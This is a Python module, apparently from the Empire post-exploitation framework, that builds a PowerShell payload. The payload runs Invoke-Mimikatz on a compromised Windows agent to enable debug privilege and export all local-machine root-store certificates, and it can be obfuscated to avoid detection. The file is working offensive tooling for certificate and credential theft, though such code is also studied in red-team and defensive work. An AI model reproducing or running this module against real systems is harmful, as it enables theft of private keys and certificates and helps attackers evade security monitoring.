from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Mimikatz DumpCerts',

            'Author': ['@JosephBialek', '@gentilkiwi'],

            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                            "to extract all certificates to the local directory."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'http://clymb3r.wordpress.com/',
                'http://blog.gentilkiwi.com'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        
        # add in the cert dumping command
        scriptEnd = """Invoke-Mimikatz -Command 'crypto::capi privilege::debug crypto::cng "crypto::certificates /systemstore:local_machine /store:root /export"' """
        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
